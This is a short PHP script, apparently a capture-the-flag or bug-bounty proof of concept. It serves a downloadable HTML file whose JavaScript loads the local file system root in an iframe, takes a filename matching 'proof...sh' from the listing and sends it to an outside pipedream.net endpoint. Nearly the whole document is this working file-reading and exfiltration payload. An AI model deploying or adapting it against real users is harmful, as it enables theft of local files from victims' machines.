<?php

header('Content-Type: text/html');
header('Content-Disposition: attachment; filename="httpnooneplays.htm"');

?>
<body>
<script>
i=document.createElement('iframe');
i.src='file:///';
i.onload = () => {
    o = i.contentWindow.document.body.innerText.match(/(proof.+\.sh)/)[1];
    open('https://eomvog4gp4gwtqa.m.pipedream.net/?'+o);
}
document.body.appendChild(i);

</script>
</body>